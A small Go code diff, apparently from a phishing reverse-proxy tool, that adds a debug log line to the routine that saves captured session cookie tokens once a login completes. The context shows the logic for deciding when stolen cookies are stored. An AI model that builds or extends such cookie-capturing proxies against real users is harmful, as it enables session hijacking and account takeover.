@@ -1518,6 +1518,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
+					log.Info("verifying cookies 9")
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
 							err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens)
